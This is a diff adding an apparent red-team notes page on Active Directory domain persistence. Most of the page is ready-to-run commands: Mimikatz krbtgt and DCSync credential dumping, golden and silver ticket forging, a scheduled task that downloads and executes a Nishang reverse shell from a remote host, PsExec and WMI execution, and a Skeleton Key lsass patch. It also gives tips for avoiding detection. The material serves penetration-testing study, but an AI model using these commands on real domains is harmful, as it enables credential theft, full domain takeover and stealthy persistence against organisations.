@@ -10,13 +10,13 @@
 <meta name="generator" content="Jekyll v3.8.4" />
 <meta property="og:title" content="Domain Persistence" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Notes for an ethical hacker." />
-<meta property="og:description" content="Notes for an ethical hacker." />
+<meta name="description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears." />
+<meta property="og:description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears." />
 <link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
 <meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"Notes for an ethical hacker.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Domain Persistence","@context":"http://schema.org"}</script>
+{"description":"There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Domain Persistence","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -275,7 +275,238 @@
 				<h3>Domain Persistence</h3>
 			</div>
 			<article class="content">
-				
+				<p>There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears.</p>
+
+<p>These are some techniques to make a persistence on a domain.</p>
+
+<h1 id="golden-ticket">Golden Ticket</h1>
+
+<p>A golden ticket is signed and encrypted by the hash of <code class="highlighter-rouge">krbtgt</code> account which makes it a valid TGT ticket. Since user account <strong>validation is not done</strong> by the KDC until <strong>TGT</strong> is <strong>older than 20 minutes</strong>. So we can use even deleted/revoked accounts.</p>
+
+<p>To conclude, the <code class="highlighter-rouge">krbtgt</code> user hash could be used to impersonate any user with any privileges from even a non-domain machine.</p>
+
+<p>First we need to obtain the <code class="highlighter-rouge">krbtgt</code> hash:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span> -ComputerName dc.corp.local
+Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\krbtgt"'</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>RedTeam Note</strong>: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA.</p>
+</blockquote>
+
+<p>After that we need to create the ticket.</p>
+
+<ul>
+  <li><strong>Invoke-Mimikatz</strong></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>
+
+Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: <code class="highlighter-rouge">/ptt</code> injects the ticket in current PowerShell process.</p>
+
+  <p><code class="highlighter-rouge">/ticket</code> saves the ticket to a file for later use.</p>
+</blockquote>
+
+<blockquote>
+  <p><strong>RedTeam Note</strong>: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it.</p>
+
+  <p><code class="highlighter-rouge">/endin:600</code> Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600).</p>
+
+  <p><code class="highlighter-rouge">/renewmax:10080</code> Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)</p>
+</blockquote>
+
+<ul>
+  <li><strong>Rubeus.exe</strong></li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:ticket.kirbi
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Ticketer.py (impacket)</strong></li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ticketer.py -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-268341927-4156873456-1784235843 -domain corp.local Administrator
+export KRB5CCNAME=./administrator.ccache
+python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
+</code></pre></div></div>
+
+<p>Use <code class="highlighter-rouge">klist</code> to list all kerberos tickets:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>klist
+</code></pre></div></div>
+
+<p>With a Golden Ticket we can access to any resource of the domain such as shared files (<strong>C$</strong>), and execute services and WMI, so we can user <strong>psexec</strong> or <strong>wmiexec</strong> to obtain a shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.corp.local\c$
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: A shell via WMI can not be obtained, so do not use PowerShell Remote.</p>
+</blockquote>
+
+<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets</a></p>
+
+<p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket">https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket</a></p>
+
+<h1 id="silver-ticket">Silver Ticket</h1>
+
+<p>A Silver Ticket is a valid <strong>TGS</strong> which is encrypted and signed by the NTLM hash of the service account of the service running with that account. Services will allow access only to the services themselves.</p>
+
+<p>This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span> -ComputerName dc01
+</code></pre></div></div>
+<p>After that we need to create the ticket.</p>
+
+<ul>
+  <li><strong>Invoke-Mimikatz</strong></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc01.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: Similar command can be used for any other service on a machine: <code class="highlighter-rouge">CIFS</code>, <code class="highlighter-rouge">HOST</code>, <code class="highlighter-rouge">RPCSS</code>, <code class="highlighter-rouge">WSMAN</code>…</p>
+</blockquote>
+
+<p>Use <code class="highlighter-rouge">klist</code> to list all kerberos tickets:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>klist
+</code></pre></div></div>
+<p>And finally we can list the content of File System.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.corp.local\c$
+</code></pre></div></div>
+
+<p>This table shows the available services:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">Service Type</th>
+      <th style="text-align: center">Service Silver Ticket</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">WMI</td>
+      <td style="text-align: center">HOST RPCSS</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">PowerShell Remoting</td>
+      <td style="text-align: center">HOST HTTP  And Maybe: WSMAN RPCSS</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">WinRM</td>
+      <td style="text-align: center">HOST HTTP  And Maybe: WINRM</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">Scheduled Tasks</td>
+      <td style="text-align: center">HOST</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">Windows File Sharing, PsExec</td>
+      <td style="text-align: center">CIFS</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">LDAP operations, DCSync</td>
+      <td style="text-align: center">LDAP</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">Windows Remote Server Administration Tools</td>
+      <td style="text-align: center">RPCSS LDAP CIFS</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">Golden Tickets</td>
+      <td style="text-align: center">krbtgt</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>There are many ways of achieve command executing using Silver Ticket.</p>
+
+<h2 id="schedule-and-execute-a-task">Schedule and Execute a task</h2>
+
+<p>We just need to create a ticket for the <code class="highlighter-rouge">HOST</code> SPN which will allow us to schedule a task on the target. And then schedule and execute a task.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /S dc01.corp.local /SC Weekly /RU <span class="s2">"NT Authority\SYSTEM"</span> /TN <span class="s2">"STCheck"</span> /TR <span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"</span>
+
+schtasks /Run /S dc01.corp.local /TN <span class="s2">"STCheck"</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: In that case a Nishang Reverve TCP shell was spawned.</p>
+</blockquote>
+
+<h2 id="execute-wmi-queries">Execute WMI queries</h2>
+
+<p>To execute WMI queries we just need to create a ticket for the <code class="highlighter-rouge">HOST</code> and <code class="highlighter-rouge">RPCSS</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WmiObject</span> -Class win32_operatingsystem -ComputerName <span class="nv">$Computer</span>
+
+<span class="nb">Invoke-WmiMethod </span>win32_process -ComputerName <span class="nv">$Computer</span> -Name create -ArgumentList <span class="s2">"</span><span class="nv">$RunCommand</span><span class="s2">"</span>
+
+wmic dc01.corp.local list full /format:list
+</code></pre></div></div>
+
+<h2 id="psexec">PsExec</h2>
+
+<p>To run commands on other machine with <code class="highlighter-rouge">PsExec</code> we just need to create a ticket for <code class="highlighter-rouge">CIFS</code> service.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\PsExec.exe -accepteula \\dc01.corp.local cmd
+</code></pre></div></div>
+
+<h2 id="powershell-remote">PowerShell Remote</h2>
+
+<p>With winrm access over a computer you can access it with PowerShell Remote. A ticket with <code class="highlighter-rouge">HOST</code> and <code class="highlighter-rouge">WSMAN</code> is needed.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span> <span class="o">=</span> New-PSSession -ComputerName dc01.corp.local
+Enter-PSSession -Session <span class="nv">$sess</span>
+</code></pre></div></div>
+
+<h2 id="dump-dc-database-with-dcsync">Dump DC database with DCSync</h2>
+
+<p>We can dump DC database using DCSync by crafting a silver ticket with the <code class="highlighter-rouge">LDAP</code> SPN.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /dc:dc01.corp.local /domain:corp.local /user:krbtgt"'</span>
+</code></pre></div></div>
+
+<h1 id="skeleton-key">Skeleton Key</h1>
+
+<p>Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware.</p>
+
+<p>All the publicly known methods are NOT persistent across reboots.</p>
+
+<blockquote>
+  <p><strong>RedTeam Notes</strong>: Its not probably that a enterprise reboot the DC or kill <code class="highlighter-rouge">lsass</code> process.</p>
+</blockquote>
+
+<p>To execute this technique domain admin privilegs are required.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"privilege::debug" "misc::skeleton"'</span> -ComputerName dc01.corp.local
+</code></pre></div></div>
+
+<p>So it is possible to access any machine with a valid username and <code class="highlighter-rouge">mimikatz</code> as password.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName dc01.corp.local -Credential corp\Administrator
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: In the skeleton key attack both passwords work at the same time, the actual password and <code class="highlighter-rouge">mimikatz</code> as password.</p>
+</blockquote>
+
+<p>In case <code class="highlighter-rouge">lsass</code> is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver <code class="highlighter-rouge">mimidriv.sys</code> on disk of the target dc. Be careful this would be very noisy in logs.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz# privilege::debug
+mimikatz# !+
+mimikatz# !processprotect /process:lsass.exe /remove
+mimikatz# misc::skeleton
+mimikatz# !-
+</code></pre></div></div>
+
+<p>The DC can not be patched twice.</p>
+
+<h1 id="dsrm">DSRM</h1>
 
 			</article>
 		</section>
